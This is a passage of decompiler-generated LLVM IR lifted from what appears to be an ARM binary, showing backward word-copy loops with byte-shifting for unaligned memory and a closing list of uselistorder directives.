dec_label_pc_14e34.dec_label_pc_14e34_crit_edge:  ; preds = %dec_label_pc_14e34
  %v0_14e34.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14e38.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14e34

dec_label_pc_14e64:                               ; preds = %dec_label_pc_14e34
  %v2_14e64 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14e64, i32* @r4, align 4
  %v5_14e64 = load i8*, i8** %stack_var_-8, align 4
  %v6_14e64 = ptrtoint i8* %v5_14e64 to i32
  store i32 %v6_14e64, i32* @r5, align 4
  store i32 %v11_14e30, i32* @lr, align 4
  %v2_14e68 = add i32 %v0_14e5c, -4
  store i32 %v2_14e68, i32* %r2.global-to-local, align 4
  %v4_14e68 = add i32 %v0_14e5c, 2147483632
  %v5_14e68 = and i32 %v2_14e68, %v4_14e68
  %v6_14e68 = icmp slt i32 %v5_14e68, 0
  store i1 %v6_14e68, i1* %cpsr_v.global-to-local, align 1
  %v7_14e68 = icmp slt i32 %v2_14e68, 0
  store i1 %v7_14e68, i1* %cpsr_n.global-to-local, align 1
  %v5_14e6c = icmp slt i32 %v2_14e5c, -12
  br i1 %v5_14e6c, label %dec_label_pc_14e88, label %dec_label_pc_14e70

dec_label_pc_14e70:                               ; preds = %dec_label_pc_14e64, %dec_label_pc_14e24, %dec_label_pc_14e70
  %v1_14e7c = phi i32 [ %v5_14e7c, %dec_label_pc_14e70 ], [ %v1_14e58, %dec_label_pc_14e64 ], [ %v0_14e5831, %dec_label_pc_14e24 ]
  %v0_14e70 = load i32, i32* %r3.global-to-local, align 4
  %v3_14e70 = mul i32 %v0_14e70, 256
  store i32 %v3_14e70, i32* %ip.global-to-local, align 4
  %v0_14e74 = load i32, i32* %r1.global-to-local, align 4
  %v1_14e74 = add i32 %v0_14e74, -4
  %v2_14e74 = inttoptr i32 %v1_14e74 to i32*
  %v3_14e74 = load i32, i32* %v2_14e74, align 4
  store i32 %v3_14e74, i32* %r3.global-to-local, align 4
  store i32 %v1_14e74, i32* %r1.global-to-local, align 4
  %v4_14e78 = udiv i32 %v3_14e74, 16777216
  %v5_14e78 = or i32 %v4_14e78, %v3_14e70
  store i32 %v5_14e78, i32* @ip, align 4
  %v2_14e7c = add i32 %v1_14e7c, -4
  %v3_14e7c = inttoptr i32 %v2_14e7c to i32*
  store i32 %v5_14e78, i32* %v3_14e7c, align 4
  %v4_14e7c = load i32, i32* %r0.global-to-local, align 4
  %v5_14e7c = add i32 %v4_14e7c, -4
  store i32 %v5_14e7c, i32* %r0.global-to-local, align 4
  %v0_14e80 = load i32, i32* %r2.global-to-local, align 4
  %v2_14e80 = add i32 %v0_14e80, -4
  store i32 %v2_14e80, i32* %r2.global-to-local, align 4
  %v6_14e84 = icmp slt i32 %v0_14e80, 4
  br i1 %v6_14e84, label %dec_label_pc_14e88.loopexit, label %dec_label_pc_14e70

dec_label_pc_14e88.loopexit:                      ; preds = %dec_label_pc_14e70
  %v4_14e80 = sub i32 3, %v0_14e80
  %v5_14e80 = and i32 %v4_14e80, %v0_14e80
  %v6_14e80 = icmp slt i32 %v5_14e80, 0
  %v7_14e80 = icmp slt i32 %v2_14e80, 0
  store i1 %v6_14e80, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14e80, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14e88

dec_label_pc_14e88:                               ; preds = %dec_label_pc_14e88.loopexit, %dec_label_pc_14e64
  %v2_14dcc63 = phi i32 [ %v5_14e7c, %dec_label_pc_14e88.loopexit ], [ %v1_14e58, %dec_label_pc_14e64 ]
  %v0_14dbc59 = phi i32 [ %v2_14e80, %dec_label_pc_14e88.loopexit ], [ %v2_14e68, %dec_label_pc_14e64 ]
  %v0_14e88 = load i32, i32* %r1.global-to-local, align 4
  %v1_14e88 = add i32 %v0_14e88, 3
  store i32 %v1_14e88, i32* @r1, align 4
  br label %bb143

dec_label_pc_14e90:                               ; preds = %dec_label_pc_14e20
  br i1 %v5_14f00, label %dec_label_pc_14edc, label %dec_label_pc_14e98

dec_label_pc_14e98:                               ; preds = %dec_label_pc_14e90
  store i32 %v2_14efc, i32* %r2.global-to-local, align 4
  %v3_14e9c = load i32, i32* @r4, align 4
  store i32 %v3_14e9c, i32* %stack_var_-12, align 4
  %v6_14e9c = load i32, i32* @r5, align 4
  %v8_14e9c = inttoptr i32 %v6_14e9c to i8*
  store i8* %v8_14e9c, i8** %stack_var_-8, align 4
  %v11_14e9c = load i32, i32* @lr, align 4
  br label %dec_label_pc_14ea0

dec_label_pc_14ea0:                               ; preds = %dec_label_pc_14ea0.dec_label_pc_14ea0_crit_edge, %dec_label_pc_14e98
  %v0_14ec4 = phi i32 [ %v1_14ec4, %dec_label_pc_14ea0.dec_label_pc_14ea0_crit_edge ], [ %v0_14e5831, %dec_label_pc_14e98 ]
  %v0_14ea4 = phi i32 [ %v0_14ea4.pre, %dec_label_pc_14ea0.dec_label_pc_14ea0_crit_edge ], [ %v1_14e10, %dec_label_pc_14e98 ]
  %v0_14ea0 = phi i32 [ %v0_14ea0.pre, %dec_label_pc_14ea0.dec_label_pc_14ea0_crit_edge ], [ %v2_14e14, %dec_label_pc_14e98 ]
  %v3_14ea0 = mul i32 %v0_14ea0, 65536
  store i32 %v3_14ea0, i32* %lr.global-to-local, align 4
  %v1_14ea4 = add i32 %v0_14ea4, -4
  %v2_14ea4 = inttoptr i32 %v1_14ea4 to i32*
  %v3_14ea4 = load i32, i32* %v2_14ea4, align 4
  store i32 %v3_14ea4, i32* %r3.global-to-local, align 4
  %v4_14ea4 = add i32 %v0_14ea4, -8
  %v5_14ea4 = inttoptr i32 %v4_14ea4 to i32*
  %v6_14ea4 = load i32, i32* %v5_14ea4, align 4
  store i32 %v6_14ea4, i32* %r4.global-to-local, align 4
  %v7_14ea4 = add i32 %v0_14ea4, -12
  %v8_14ea4 = inttoptr i32 %v7_14ea4 to i32*
  %v9_14ea4 = load i32, i32* %v8_14ea4, align 4
  store i32 %v9_14ea4, i32* %r5.global-to-local, align 4
  %v10_14ea4 = add i32 %v0_14ea4, -16
  %v11_14ea4 = inttoptr i32 %v10_14ea4 to i32*
  %v12_14ea4 = load i32, i32* %v11_14ea4, align 4
  store i32 %v10_14ea4, i32* %r1.global-to-local, align 4
  %v4_14ea8 = udiv i32 %v12_14ea4, 65536
  %v5_14ea8 = or i32 %v4_14ea8, %v3_14ea0
  store i32 %v5_14ea8, i32* %lr.global-to-local, align 4
  %v3_14eac = mul i32 %v12_14ea4, 65536
  %v4_14eb0 = udiv i32 %v9_14ea4, 65536
  %v5_14eb0 = or i32 %v3_14eac, %v4_14eb0
  store i32 %v5_14eb0, i32* @ip, align 4
  %v3_14eb4 = mul i32 %v9_14ea4, 65536
  %v4_14eb8 = udiv i32 %v6_14ea4, 65536
  %v5_14eb8 = or i32 %v3_14eb4, %v4_14eb8
  store i32 %v5_14eb8, i32* %r5.global-to-local, align 4
  %v3_14ebc = mul i32 %v6_14ea4, 65536
  %v4_14ec0 = udiv i32 %v3_14ea4, 65536
  %v5_14ec0 = or i32 %v3_14ebc, %v4_14ec0
  store i32 %v5_14ec0, i32* %r4.global-to-local, align 4
  %v1_14ec4 = add i32 %v0_14ec4, -16
  %v2_14ec4 = inttoptr i32 %v1_14ec4 to i32*
  store i32 %v5_14ec0, i32* %v2_14ec4, align 4
  %v4_14ec4 = add i32 %v0_14ec4, -12
  %v5_14ec4 = inttoptr i32 %v4_14ec4 to i32*
  %v6_14ec4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14ec4, i32* %v5_14ec4, align 4
  %v7_14ec4 = add i32 %v0_14ec4, -8
  %v8_14ec4 = inttoptr i32 %v7_14ec4 to i32*
  %v9_14ec4 = load i32, i32* @ip, align 4
  store i32 %v9_14ec4, i32* %v8_14ec4, align 4
  %v10_14ec4 = add i32 %v0_14ec4, -4
  %v11_14ec4 = inttoptr i32 %v10_14ec4 to i32*
  %v12_14ec4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14ec4, i32* %v11_14ec4, align 4
  store i32 %v1_14ec4, i32* %r0.global-to-local, align 4
  %v0_14ec8 = load i32, i32* %r2.global-to-local, align 4
  %v2_14ec8 = add i32 %v0_14ec8, -16
  store i32 %v2_14ec8, i32* %r2.global-to-local, align 4
  %v6_14ecc = icmp slt i32 %v0_14ec8, 16
  br i1 %v6_14ecc, label %dec_label_pc_14ed0, label %dec_label_pc_14ea0.dec_label_pc_14ea0_crit_edge

dec_label_pc_14ea0.dec_label_pc_14ea0_crit_edge:  ; preds = %dec_label_pc_14ea0
  %v0_14ea0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14ea4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14ea0

dec_label_pc_14ed0:                               ; preds = %dec_label_pc_14ea0
  %v2_14ed0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14ed0, i32* @r4, align 4
  %v5_14ed0 = load i8*, i8** %stack_var_-8, align 4
  %v6_14ed0 = ptrtoint i8* %v5_14ed0 to i32
  store i32 %v6_14ed0, i32* @r5, align 4
  store i32 %v11_14e9c, i32* @lr, align 4
  %v2_14ed4 = add i32 %v0_14ec8, -4
  store i32 %v2_14ed4, i32* %r2.global-to-local, align 4
  %v4_14ed4 = add i32 %v0_14ec8, 2147483632
  %v5_14ed4 = and i32 %v2_14ed4, %v4_14ed4
  %v6_14ed4 = icmp slt i32 %v5_14ed4, 0
  store i1 %v6_14ed4, i1* %cpsr_v.global-to-local, align 1
  %v7_14ed4 = icmp slt i32 %v2_14ed4, 0
  store i1 %v7_14ed4, i1* %cpsr_n.global-to-local, align 1
  %v5_14ed8 = icmp slt i32 %v2_14ec8, -12
  br i1 %v5_14ed8, label %dec_label_pc_14ef4, label %dec_label_pc_14edc

dec_label_pc_14edc:                               ; preds = %dec_label_pc_14ed0, %dec_label_pc_14e90, %dec_label_pc_14edc
  %v1_14ee8 = phi i32 [ %v5_14ee8, %dec_label_pc_14edc ], [ %v1_14ec4, %dec_label_pc_14ed0 ], [ %v0_14e5831, %dec_label_pc_14e90 ]
  %v0_14edc = load i32, i32* %r3.global-to-local, align 4
  %v3_14edc = mul i32 %v0_14edc, 65536
  store i32 %v3_14edc, i32* %ip.global-to-local, align 4
  %v0_14ee0 = load i32, i32* %r1.global-to-local, align 4
  %v1_14ee0 = add i32 %v0_14ee0, -4
  %v2_14ee0 = inttoptr i32 %v1_14ee0 to i32*
  %v3_14ee0 = load i32, i32* %v2_14ee0, align 4
  store i32 %v3_14ee0, i32* %r3.global-to-local, align 4
  store i32 %v1_14ee0, i32* %r1.global-to-local, align 4
  %v4_14ee4 = udiv i32 %v3_14ee0, 65536
  %v5_14ee4 = or i32 %v4_14ee4, %v3_14edc
  store i32 %v5_14ee4, i32* @ip, align 4
  %v2_14ee8 = add i32 %v1_14ee8, -4
  %v3_14ee8 = inttoptr i32 %v2_14ee8 to i32*
  store i32 %v5_14ee4, i32* %v3_14ee8, align 4
  %v4_14ee8 = load i32, i32* %r0.global-to-local, align 4
  %v5_14ee8 = add i32 %v4_14ee8, -4
  store i32 %v5_14ee8, i32* %r0.global-to-local, align 4
  %v0_14eec = load i32, i32* %r2.global-to-local, align 4
  %v2_14eec = add i32 %v0_14eec, -4
  store i32 %v2_14eec, i32* %r2.global-to-local, align 4
  %v6_14ef0 = icmp slt i32 %v0_14eec, 4
  br i1 %v6_14ef0, label %dec_label_pc_14ef4.loopexit, label %dec_label_pc_14edc

dec_label_pc_14ef4.loopexit:                      ; preds = %dec_label_pc_14edc
  %v4_14eec = sub i32 3, %v0_14eec
  %v5_14eec = and i32 %v4_14eec, %v0_14eec
  %v6_14eec = icmp slt i32 %v5_14eec, 0
  %v7_14eec = icmp slt i32 %v2_14eec, 0
  store i1 %v6_14eec, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14eec, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14ef4

dec_label_pc_14ef4:                               ; preds = %dec_label_pc_14ef4.loopexit, %dec_label_pc_14ed0
  %v2_14dcc64 = phi i32 [ %v5_14ee8, %dec_label_pc_14ef4.loopexit ], [ %v1_14ec4, %dec_label_pc_14ed0 ]
  %v0_14dbc60 = phi i32 [ %v2_14eec, %dec_label_pc_14ef4.loopexit ], [ %v2_14ed4, %dec_label_pc_14ed0 ]
  %v0_14ef4 = load i32, i32* %r1.global-to-local, align 4
  %v1_14ef4 = add i32 %v0_14ef4, 2
  store i32 %v1_14ef4, i32* @r1, align 4
  br label %bb143

dec_label_pc_14efc:                               ; preds = %dec_label_pc_14e10
  br i1 %v5_14f00, label %dec_label_pc_14f48, label %dec_label_pc_14f04

dec_label_pc_14f04:                               ; preds = %dec_label_pc_14efc
  store i32 %v2_14efc, i32* %r2.global-to-local, align 4
  %v3_14f08 = load i32, i32* @r4, align 4
  store i32 %v3_14f08, i32* %stack_var_-12, align 4
  %v6_14f08 = load i32, i32* @r5, align 4
  %v8_14f08 = inttoptr i32 %v6_14f08 to i8*
  store i8* %v8_14f08, i8** %stack_var_-8, align 4
  %v11_14f08 = load i32, i32* @lr, align 4
  br label %dec_label_pc_14f0c

dec_label_pc_14f0c:                               ; preds = %dec_label_pc_14f0c.dec_label_pc_14f0c_crit_edge, %dec_label_pc_14f04
  %v0_14f30 = phi i32 [ %v1_14f30, %dec_label_pc_14f0c.dec_label_pc_14f0c_crit_edge ], [ %v0_14e5831, %dec_label_pc_14f04 ]
  %v0_14f10 = phi i32 [ %v0_14f10.pre, %dec_label_pc_14f0c.dec_label_pc_14f0c_crit_edge ], [ %v1_14e10, %dec_label_pc_14f04 ]
  %v0_14f0c = phi i32 [ %v0_14f0c.pre, %dec_label_pc_14f0c.dec_label_pc_14f0c_crit_edge ], [ %v2_14e14, %dec_label_pc_14f04 ]
  %v3_14f0c = mul i32 %v0_14f0c, 16777216
  store i32 %v3_14f0c, i32* %lr.global-to-local, align 4
  %v1_14f10 = add i32 %v0_14f10, -4
  %v2_14f10 = inttoptr i32 %v1_14f10 to i32*
  %v3_14f10 = load i32, i32* %v2_14f10, align 4
  store i32 %v3_14f10, i32* %r3.global-to-local, align 4
  %v4_14f10 = add i32 %v0_14f10, -8
  %v5_14f10 = inttoptr i32 %v4_14f10 to i32*
  %v6_14f10 = load i32, i32* %v5_14f10, align 4
  store i32 %v6_14f10, i32* %r4.global-to-local, align 4
  %v7_14f10 = add i32 %v0_14f10, -12
  %v8_14f10 = inttoptr i32 %v7_14f10 to i32*
  %v9_14f10 = load i32, i32* %v8_14f10, align 4
  store i32 %v9_14f10, i32* %r5.global-to-local, align 4
  %v10_14f10 = add i32 %v0_14f10, -16
  %v11_14f10 = inttoptr i32 %v10_14f10 to i32*
  %v12_14f10 = load i32, i32* %v11_14f10, align 4
  store i32 %v10_14f10, i32* %r1.global-to-local, align 4
  %v4_14f14 = udiv i32 %v12_14f10, 256
  %v5_14f14 = or i32 %v4_14f14, %v3_14f0c
  store i32 %v5_14f14, i32* %lr.global-to-local, align 4
  %v3_14f18 = mul i32 %v12_14f10, 16777216
  %v4_14f1c = udiv i32 %v9_14f10, 256
  %v5_14f1c = or i32 %v3_14f18, %v4_14f1c
  store i32 %v5_14f1c, i32* @ip, align 4
  %v3_14f20 = mul i32 %v9_14f10, 16777216
  %v4_14f24 = udiv i32 %v6_14f10, 256
  %v5_14f24 = or i32 %v3_14f20, %v4_14f24
  store i32 %v5_14f24, i32* %r5.global-to-local, align 4
  %v3_14f28 = mul i32 %v6_14f10, 16777216
  %v4_14f2c = udiv i32 %v3_14f10, 256
  %v5_14f2c = or i32 %v3_14f28, %v4_14f2c
  store i32 %v5_14f2c, i32* %r4.global-to-local, align 4
  %v1_14f30 = add i32 %v0_14f30, -16
  %v2_14f30 = inttoptr i32 %v1_14f30 to i32*
  store i32 %v5_14f2c, i32* %v2_14f30, align 4
  %v4_14f30 = add i32 %v0_14f30, -12
  %v5_14f30 = inttoptr i32 %v4_14f30 to i32*
  %v6_14f30 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14f30, i32* %v5_14f30, align 4
  %v7_14f30 = add i32 %v0_14f30, -8
  %v8_14f30 = inttoptr i32 %v7_14f30 to i32*
  %v9_14f30 = load i32, i32* @ip, align 4
  store i32 %v9_14f30, i32* %v8_14f30, align 4
  %v10_14f30 = add i32 %v0_14f30, -4
  %v11_14f30 = inttoptr i32 %v10_14f30 to i32*
  %v12_14f30 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14f30, i32* %v11_14f30, align 4
  store i32 %v1_14f30, i32* %r0.global-to-local, align 4
  %v0_14f34 = load i32, i32* %r2.global-to-local, align 4
  %v2_14f34 = add i32 %v0_14f34, -16
  store i32 %v2_14f34, i32* %r2.global-to-local, align 4
  %v6_14f38 = icmp slt i32 %v0_14f34, 16
  br i1 %v6_14f38, label %dec_label_pc_14f3c, label %dec_label_pc_14f0c.dec_label_pc_14f0c_crit_edge

dec_label_pc_14f0c.dec_label_pc_14f0c_crit_edge:  ; preds = %dec_label_pc_14f0c
  %v0_14f0c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14f10.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14f0c

dec_label_pc_14f3c:                               ; preds = %dec_label_pc_14f0c
  %v2_14f3c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14f3c, i32* @r4, align 4
  %v5_14f3c = load i8*, i8** %stack_var_-8, align 4
  %v6_14f3c = ptrtoint i8* %v5_14f3c to i32
  store i32 %v6_14f3c, i32* @r5, align 4
  store i32 %v11_14f08, i32* @lr, align 4
  %v2_14f40 = add i32 %v0_14f34, -4
  store i32 %v2_14f40, i32* %r2.global-to-local, align 4
  %v4_14f40 = add i32 %v0_14f34, 2147483632
  %v5_14f40 = and i32 %v2_14f40, %v4_14f40
  %v6_14f40 = icmp slt i32 %v5_14f40, 0
  store i1 %v6_14f40, i1* %cpsr_v.global-to-local, align 1
  %v7_14f40 = icmp slt i32 %v2_14f40, 0
  store i1 %v7_14f40, i1* %cpsr_n.global-to-local, align 1
  %v5_14f44 = icmp slt i32 %v2_14f34, -12
  br i1 %v5_14f44, label %dec_label_pc_14f60, label %dec_label_pc_14f48

dec_label_pc_14f48:                               ; preds = %dec_label_pc_14f3c, %dec_label_pc_14efc, %dec_label_pc_14f48
  %v1_14f54 = phi i32 [ %v5_14f54, %dec_label_pc_14f48 ], [ %v1_14f30, %dec_label_pc_14f3c ], [ %v0_14e5831, %dec_label_pc_14efc ]
  %v0_14f48 = load i32, i32* %r3.global-to-local, align 4
  %v3_14f48 = mul i32 %v0_14f48, 16777216
  store i32 %v3_14f48, i32* %ip.global-to-local, align 4
  %v0_14f4c = load i32, i32* %r1.global-to-local, align 4
  %v1_14f4c = add i32 %v0_14f4c, -4
  %v2_14f4c = inttoptr i32 %v1_14f4c to i32*
  %v3_14f4c = load i32, i32* %v2_14f4c, align 4
  store i32 %v3_14f4c, i32* %r3.global-to-local, align 4
  store i32 %v1_14f4c, i32* %r1.global-to-local, align 4
  %v4_14f50 = udiv i32 %v3_14f4c, 256
  %v5_14f50 = or i32 %v4_14f50, %v3_14f48
  store i32 %v5_14f50, i32* @ip, align 4
  %v2_14f54 = add i32 %v1_14f54, -4
  %v3_14f54 = inttoptr i32 %v2_14f54 to i32*
  store i32 %v5_14f50, i32* %v3_14f54, align 4
  %v4_14f54 = load i32, i32* %r0.global-to-local, align 4
  %v5_14f54 = add i32 %v4_14f54, -4
  store i32 %v5_14f54, i32* %r0.global-to-local, align 4
  %v0_14f58 = load i32, i32* %r2.global-to-local, align 4
  %v2_14f58 = add i32 %v0_14f58, -4
  store i32 %v2_14f58, i32* %r2.global-to-local, align 4
  %v6_14f5c = icmp slt i32 %v0_14f58, 4
  br i1 %v6_14f5c, label %dec_label_pc_14f60.loopexit, label %dec_label_pc_14f48

dec_label_pc_14f60.loopexit:                      ; preds = %dec_label_pc_14f48
  %v4_14f58 = sub i32 3, %v0_14f58
  %v5_14f58 = and i32 %v4_14f58, %v0_14f58
  %v6_14f58 = icmp slt i32 %v5_14f58, 0
  %v7_14f58 = icmp slt i32 %v2_14f58, 0
  store i1 %v6_14f58, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14f58, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14f60

dec_label_pc_14f60:                               ; preds = %dec_label_pc_14f60.loopexit, %dec_label_pc_14f3c
  %v2_14dcc65 = phi i32 [ %v5_14f54, %dec_label_pc_14f60.loopexit ], [ %v1_14f30, %dec_label_pc_14f3c ]
  %v0_14dbc61 = phi i32 [ %v2_14f58, %dec_label_pc_14f60.loopexit ], [ %v2_14f40, %dec_label_pc_14f3c ]
  %v0_14f60 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f60 = add i32 %v0_14f60, 1
  store i32 %v1_14f60, i32* @r1, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_14f54, { 0, 2, 1 }
  uselistorder i32 %v3_14f48, { 1, 0 }
  uselistorder i32 %v2_14f40, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14f30, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14f10, { 1, 0 }
  uselistorder i32 %v3_14f0c, { 1, 0 }
  uselistorder i32 %v0_14f10, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14f30, { 3, 2, 1, 0 }
  uselistorder i32 %v5_14ee8, { 0, 2, 1 }
  uselistorder i32 %v3_14edc, { 1, 0 }
  uselistorder i32 %v2_14ed4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14ec4, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14ea4, { 1, 0 }
  uselistorder i32 %v3_14ea0, { 1, 0 }
  uselistorder i32 %v0_14ea4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14ec4, { 3, 2, 1, 0 }
  uselistorder i32 %v5_14e7c, { 0, 2, 1 }
  uselistorder i32 %v3_14e70, { 1, 0 }
  uselistorder i32 %v2_14e68, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14e58, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14e38, { 1, 0 }
  uselistorder i32 %v3_14e34, { 1, 0 }
  uselistorder i32 %v0_14e38, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14e58, { 3, 2, 1, 0 }
  uselistorder i1 %v5_14f00, { 2, 0, 1 }
  uselistorder i32 %v0_14e18, { 1, 0 }
  uselistorder i32 %v0_14f04, { 3, 0, 2, 1 }
  uselistorder i32 %v0_14e5831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_14e08, { 2, 1, 0 }
  uselistorder i32 %v0_14e08, { 2, 0, 1 }
  uselistorder i32 %v2_14e00, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_14e00, { 1, 0, 2 }
  uselistorder i32 %v0_14e00, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14e5832, { 2, 1, 0 }
  uselistorder i32 %v11_14ddc, { 1, 0 }
  uselistorder i32 %v7_14ddc, { 1, 0 }
  uselistorder i32 %v1_14dbc, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_14dbc, { 1, 2, 0, 3 }
  uselistorder i32 %v2_14dc0, { 1, 0 }
  uselistorder i32 %v7_14db4, { 0, 2, 1 }
  uselistorder i32 %v10_14db0, { 1, 0 }
  uselistorder i32 %v9_14da8, { 1, 0, 2 }
  uselistorder i32 %v6_14da4, { 1, 0 }
  uselistorder i32 %v2_14d9c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_14d9c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_14dac, { 0, 3, 2, 1 }
  uselistorder i32 %v7_14d90, { 0, 2, 1 }
  uselistorder i32 %v13_14d8c, { 1, 0 }
  uselistorder i32 %v4_14d88, { 0, 2, 1, 3 }
  uselistorder i32 %v0_14d88, { 2, 0, 1 }
  uselistorder i32 %v6_14d90, { 0, 3, 2, 1 }
  uselistorder i32 %v7_14d80, { 0, 2, 1 }
  uselistorder i32 %v16_14d7c, { 1, 0 }
  uselistorder i32 %v4_14d78, { 1, 0 }
  uselistorder i32 %v0_14d88.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_14d80, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_14d6c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_14d68, { 1, 0 }
  uselistorder i32 %v1_14d64, { 1, 0 }
  uselistorder i32 %v10_14d60, { 1, 0 }
  uselistorder i32 %v0_14d60, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14d64, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_14d58, { 0, 2, 1 }
  uselistorder i32 %v2_14d4c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_14d4c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_14d6449, { 1, 2, 0 }
  uselistorder i32 %v1_14d44, { 2, 1, 0 }
  uselistorder i32 %v1_14d3c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_14d34, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_14d30, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_14d2c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_14d2c, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_14d18, { 0, 2, 1 }
  uselistorder i32 %v3_14d0c, { 1, 0 }
  uselistorder i32 %v2_14d04, { 0, 2, 1, 3 }
  uselistorder i32 %v12_14cf4, { 1, 0, 3, 2 }
  uselistorder i32 %v8_14cd4, { 1, 0, 2 }
  uselistorder i32 %v5_14cd4, { 1, 0, 2 }
  uselistorder i32 %v2_14cd4, { 1, 0, 2 }
  uselistorder i32 %v3_14cd0, { 1, 0 }
  uselistorder i32 %v0_14cd4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14cf4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_14cac, { 0, 2, 1 }
  uselistorder i32 %v3_14ca0, { 1, 0 }
  uselistorder i32 %v2_14c98, { 0, 2, 1, 3 }
  uselistorder i32 %v12_14c88, { 1, 0, 3, 2 }
  uselistorder i32 %v8_14c68, { 1, 0, 2 }
  uselistorder i32 %v5_14c68, { 1, 0, 2 }
  uselistorder i32 %v2_14c68, { 1, 0, 2 }
  uselistorder i32 %v3_14c64, { 1, 0 }
  uselistorder i32 %v0_14c68, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14c88, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_14c40, { 0, 2, 1 }
  uselistorder i32 %v3_14c34, { 1, 0 }
  uselistorder i32 %v2_14c2c, { 0, 2, 1, 3 }
  uselistorder i32 %v12_14c1c, { 1, 0, 3, 2 }
  uselistorder i32 %v8_14bfc, { 1, 0, 2 }
  uselistorder i32 %v5_14bfc, { 1, 0, 2 }
  uselistorder i32 %v2_14bfc, { 1, 0, 2 }
  uselistorder i32 %v3_14bf8, { 1, 0 }
  uselistorder i32 %v0_14bfc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14c1c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_14cc4, { 2, 0, 1 }
  uselistorder i32 %v0_14cc8, { 3, 0, 2, 1 }
  uselistorder i32 %v0_14c1c75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_14bcc, { 1, 0 }
  uselistorder i32 %v0_14bcc, { 3, 1, 0, 2 }
  uselistorder i32 %v2_14bc4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_14bc4, { 1, 0, 2 }
  uselistorder i32 %v0_14bc4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14c1c76, { 2, 1, 0 }
  uselistorder i32 %v1_14ba4, { 1, 0, 2 }
  uselistorder i32 %v1_14b7c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_14b7c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_14b68, { 1, 0, 2 }
  uselistorder i32 %v6_14b64, { 1, 0 }
  uselistorder i32 %v2_14b5c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_14b5c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_14b6c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_14b54, { 0, 2, 1 }
  uselistorder i1 %v0_14b54, { 1, 0 }
  uselistorder i1 %v1_14b54, { 1, 0 }
  uselistorder i32 %v3_14b50, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_14b48, { 0, 2, 1, 3 }
  uselistorder i32 %v4_14b34, { 1, 0 }
  uselistorder i32 %v12_14b28, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14b1c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14b20, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_14b10, { 0, 2, 1 }
  uselistorder i32 %v2_14b08, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_14b08, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_14b00, { 1, 0 }
  uselistorder i32 %v1_14af8, { 2, 1, 0 }
  uselistorder i32 %v2_14af0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_14af0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14ae0, { 1, 0 }
  uselistorder i32 %v1_14ae0, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_14ae0, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
